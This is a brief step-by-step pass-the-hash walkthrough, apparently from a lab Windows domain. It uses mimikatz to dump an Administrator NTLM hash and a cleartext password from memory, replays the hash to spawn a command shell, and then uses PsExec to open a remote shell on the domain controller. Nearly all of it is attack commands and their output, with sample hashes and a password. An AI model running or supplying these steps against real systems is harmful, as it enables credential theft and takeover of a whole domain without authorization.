
# Pass the Hash

open mimikatz on Admin or SYSTEM privilege. Get password and hash from memory

	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # sekurlsa::logonpasswords

	Authentication Id : 0 ; 2524343 (00000000:002684b7)
	Session           : CachedInteractive from 1
	User Name         : Administrator
	Domain            : VALHALLA
	Logon Server      : ODIN
	Logon Time        : 8/21/2021 7:16:03 PM
	SID               : S-1-5-21-3410397846-649609989-2919355437-500
			msv :
			 [00010000] CredentialKeys
			 * NTLM     : c718f548c75062ada93250db208d3178
			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
			 [00000003] Primary
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * NTLM     : c718f548c75062ada93250db208d3178
			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
			tspkg :
			wdigest :
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * Password : (null)
			kerberos :
			 * Username : Administrator
			 * Domain   : VALHALLA.LOCAL
			 * Password : Pass123!
			ssp :
			credman :


use captured hash and spawn a cmd



	mimikatz # sekurlsa::pth /user:administrator /domain:valhalla.local /ntlm:c718f548c75062ada93250db208d3178
	user    : administrator
	domain  : valhalla.local
	program : cmd.exe
	impers. : no
	NTLM    : c718f548c75062ada93250db208d3178
	  |  PID  5992
	  |  TID  5732
	  |  LSA Process is now R/W
	  |  LUID 0 ; 2566096 (00000000:002727d0)
	  \_ msv1_0   - data copy @ 0000028A14C33E00 : OK !
	  \_ kerberos - data copy @ 0000028A14C99C98
	   \_ aes256_hmac       -> null
	   \_ aes128_hmac       -> null
	   \_ rc4_hmac_nt       OK
	   \_ rc4_hmac_old      OK
	   \_ rc4_md4           OK
	   \_ rc4_hmac_nt_exp   OK
	   \_ rc4_hmac_old_exp  OK
	   \_ *Password replace @ 0000028A14D670E8 (24) -> null


check for your privilege


	C:\Windows\system32>dir \\odin\C$
	 Volume in drive \\odin\C$ has no label.
	 Volume Serial Number is 3C56-D664

	 Directory of \\odin\C$

	08/22/2013  06:52 PM    <DIR>          PerfLogs
	08/13/2021  07:37 AM    <DIR>          Program Files
	08/22/2013  06:39 PM    <DIR>          Program Files (x86)
	08/13/2021  07:06 AM    <DIR>          Users
	08/14/2021  12:07 AM    <DIR>          Windows
				   0 File(s)              0 bytes
				   5 Dir(s)  54,546,784,256 bytes free


we are still in local machine

	C:\Windows\system32>hostname
	loki

if we want a remote shell we can use psexec.exe


	C:\Windows\system32>cd C:\Users\mrblack\Desktop\PSTools

	C:\Users\mrblack\Desktop\PSTools>PsExec.exe \\odin cmd.exe

	PsExec v2.34 - Execute processes remotely
	Copyright (C) 2001-2021 Mark Russinovich
	Sysinternals - www.sysinternals.com
	Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.

	C:\Windows\system32>whoami
	valhalla\administrator

	C:\Windows\system32>hostname
	odin

	C:\Windows\system32>ipconfig

	Windows IP Configuration


	Ethernet adapter Ethernet0:

	   Connection-specific DNS Suffix  . :
	   Link-local IPv6 Address . . . . . : fe80::d130:77d8:36c:afe%12
	   IPv4 Address. . . . . . . . . . . : 192.168.200.100
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . :

	Tunnel adapter isatap.{82B0F91C-D6B0-48AA-935A-1CCE190951A5}:

	   Media State . . . . . . . . . . . : Media disconnected
	   Connection-specific DNS Suffix  . :
